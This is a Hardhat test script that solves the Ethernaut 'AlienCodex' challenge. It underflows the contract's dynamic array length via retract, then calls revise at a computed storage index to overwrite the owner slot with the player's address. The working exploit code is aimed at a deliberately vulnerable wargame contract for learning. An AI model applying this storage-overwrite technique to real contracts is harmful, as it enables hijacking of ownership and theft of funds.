import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther, logEvents } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

const toByte32HexString = (n : BigNumber) => {
  let digits: string = n.toHexString().slice(2)
  return "0x" + "0".repeat(64 - digits.length) + digits;
}

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
  const challengeAddress = await createChallenge(
    `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`
  );

  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  let provider: any = eoa.provider;
  let ourAddress: string = await eoa.getAddress()


  let twoPow256: BigNumber = BigNumber.from(2n).pow(256);
  let i: BigNumber = BigNumber.from(ethers.utils.keccak256(toByte32HexString(BigNumber.from(1n))));

  let index: BigNumber = twoPow256.sub(i);

  tx = await challenge.make_contact();
  await tx.wait();
  tx = await challenge.retract();
  await tx.wait();

  console.log("calculated index", index.toHexString());
  tx = await challenge.revise(index.toHexString(), toByte32HexString(BigNumber.from(ourAddress))) ;
  await tx.wait();

});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
